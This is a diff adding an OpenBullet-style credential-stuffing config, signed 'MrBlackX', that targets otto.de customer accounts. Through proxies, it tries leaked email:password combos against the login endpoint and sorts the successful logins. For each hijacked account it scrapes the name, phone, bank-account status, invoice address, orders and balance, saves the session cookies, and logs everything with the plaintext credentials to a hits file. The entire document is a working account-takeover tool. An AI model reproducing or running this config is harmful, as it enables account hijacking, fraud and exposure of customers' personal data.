@@ -1,0 +1,204 @@
+[SETTINGS]
+{
+  "Name": "Otto.de",
+  "SuggestedBots": 50,
+  "MaxCPM": 0,
+  "LastModified": "2021-04-24T14:06:51.442865-07:00",
+  "AdditionalInfo": "@otto.de",
+  "Author": "MrBlackX",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+BEGIN SCRIPT JavaScript
+function broofa() {
+    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
+        var r = Math.random()*16|0, v = c == 'x' ? r : (r&0x3|0x8);
+        return v.toString(16);
+    });
+}
+var uuid = broofa()
+END SCRIPT -> VARS "uuid"
+
+#length FUNCTION Length "username=<USER>&password=<PASS>&lastname=&magicWord=<uuid>" -> VAR "len" 
+
+#login REQUEST POST "https://www.otto.de/user/login" 
+  CONTENT "username=<USER>&password=<PASS>&lastname=&magicWord=<uuid>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: www.otto.de" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" 
+  HEADER "Accept-Language: de,en-US;q=0.7,en;q=0.3" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Content-Length: <len>" 
+  HEADER "Origin: https://www.otto.de" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Referer: https://www.otto.de/user/login?entryPoint=loginArea" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "TE: Trailers" 
+
+#check KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Anmelden" 
+  KEYCHAIN Success OR 
+    KEY "Abmelden" 
+
+SET VAR "Owt" "<COOKIES(owt)>"
+SET VAR "lId" "<COOKIES(lId)>"
+
+#acc REQUEST GET "https://www.otto.de/user/public/loginState/footer" 
+  
+  HEADER "Host: www.otto.de" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0" 
+  HEADER "Accept: */*" 
+  HEADER "Accept-Language: de,en-US;q=0.7,en;q=0.3" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Referer: https://www.otto.de/user/accountOverview?entryPoint=loginArea" 
+  HEADER "TE: Trailers" 
+
+#name PARSE "<SOURCE>" JSON "firstName" CreateEmpty=FALSE -> CAP "Firstname" 
+
+#name2 PARSE "<SOURCE>" JSON "lastName" CreateEmpty=FALSE -> CAP "Lastname" 
+
+#payment REQUEST GET "https://www.otto.de/user/mydata?entryPoint=leftNavigation" 
+  
+  HEADER "Host: www.otto.de" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" 
+  HEADER "Accept-Language: de,en-US;q=0.7,en;q=0.3" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Referer: https://www.otto.de/user/accountOverview?entryPoint=loginArea" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "TE: Trailers" 
+
+#bank PARSE "<SOURCE>" LR "<span class=\"us_grey400 us_personalDataHint\" data-qa=\"user_noBankAccount\">" "</span>" CreateEmpty=FALSE -> CAP "Bank" 
+
+IF "<Bank>" EqualTo "Du hast noch keine Bankverbindung für deine Vorkasse-Rückzahlungen hinterlegt."
+SET CAP "Bank" "Keine Bankverbindung"
+ENDIF
+
+#phone PARSE "<SOURCE>" LR "<span class=\"us_grey400 us_label us_personalDataHint\" data-qa=\"user_noPhoneNumber\">" "</span>" CreateEmpty=FALSE -> CAP "Phone" 
+
+IF "<Phone>" EqualTo "Du hast noch keine Telefonnummern hinterlegt."
+SET CAP "Phone" "Keine Telefonverbindung"
+ENDIF
+
+#address REQUEST GET "https://www.otto.de/user/addresses?entryPoint=leftNavigation" 
+  
+  HEADER "Host: www.otto.de" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" 
+  HEADER "Accept-Language: de,en-US;q=0.7,en;q=0.3" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Referer: https://www.otto.de/user/mydata?entryPoint=leftNavigation" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Cache-Control: max-age=0" 
+
+#address PARSE "<SOURCE>" LR "<div class=\"us_address_frame_content\" data-qa=\"user_addresses_invoice_address\">" "</div>" -> VAR "Address_" 
+
+IF "<Address_>" EqualTo "Du hast noch keine Daten angegeben"
+SET CAP "Address" "Keine Adresse"
+ELSE
+
+#street PARSE "<SOURCE>" LR "<span data-qa=\"user_addresses_invoice_street\">" "</span>" -> VAR "Street" 
+
+#appartment PARSE "<SOURCE>" LR "<span data-qa=\"user_addresses_invoice_houseNumber\">" "</span><br/>" -> VAR "Appartment" 
+
+#postcode PARSE "<SOURCE>" LR "<span data-qa=\"user_addresses_invoice_postalCode\">" "</span>" -> VAR "Postcode" 
+
+#city PARSE "<SOURCE>" LR "        <span data-qa=\"user_addresses_invoice_city\">" "</span><br/>" -> VAR "City" 
+
+SET CAP "Address" "<Street> <Appartment>, <Postcode> <City>"
+ENDIF
+
+#orders REQUEST GET "https://www.otto.de/aftersales-orders-ui/positionList?fulfillmentStatusFilter=ALL" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" 
+  HEADER "Host: www.otto.de" 
+  HEADER "Accept-Language: de,en-US;q=0.7,en;q=0.3" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "TE: Trailers" 
+
+SET VAR "OUI" "<COOKIES(OUI-XSRF-TOKEN)>"
+IF "<SOURCE>" Contains "Aktuell ist diese Liste leer."
+SET CAP "Orders" "Nein"
+ELSE
+SET CAP "Orders" "Ja"
+ENDIF
+
+#balance REQUEST GET "https://www.otto.de/aftersales/balanceForBookingsAmount?entryPoint=myBookingsPage" 
+  
+  HEADER "Host: www.otto.de" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" 
+  HEADER "Accept-Language: de,en-US;q=0.7,en;q=0.3" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "TE: Trailers" 
+
+#balance PARSE "<SOURCE>" LR "<div class=\"as_balancing_for_booking_amount_value \" data-qa=\"aftersales_balancing_for_booking_amount\">" "</div>" -> VAR "Balance" 
+
+#balance PARSE "<SOURCE>" LR "<div class=\"as_balancing_for_booking_amount_value as_balancing_for_booking_amount_value--negative\" data-qa=\"aftersales_balancing_for_booking_amount\">" "</div>" -> VAR "Balance" 
+
+#Balance KEYCHECK 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<Balance>" Contains "-" 
+    KEY "<Balance>" EqualTo "€ 0,00" 
+
+#cookies UTILITY File "Cookies\\[Otto]-[<USER>]-Cookies.txt" WriteLines "www.otto.de	true	/	false	2249925915	cb	1\\nwww.otto.de	true	/	true	2249925915	lId	<lId>\\nwww.otto.de	true	/aftersales-orders-ui	false	0	<OUI>\\nwww.otto.de	true	/	true	2249925915	owt	<Owt>" -> CAP "save_cookies" 
+
+#save_hits UTILITY File "Otto Hits.txt" AppendLines "~ ~ ~ ~ < 💚 O T T O 💚 > ~ ~ ~ ~\\n\\n👥 Combo : <USER>:<PASS>\\n⚖️ Balance : <Balance>\\n📛 Name : <Firstname>, <Lastname>\\n📞 Telefonnummer: <Phone>\\n🏘 Adresse : <Address>\\n🛒 Bestellungen : <Orders>\\n🍪 Cookies : Cookies\\[Otto]-[<USER>]-Cookies.txt\\n🔐 Login: https://www.otto.de/user/login?entryPoint=loginArea\\nMade By @MrBlackX\\n\\n~ ~ ~ ~ < 💚 C O N F I G 💚 > ~ ~ ~ ~\\n" -> CAP "Save Hits" 
+
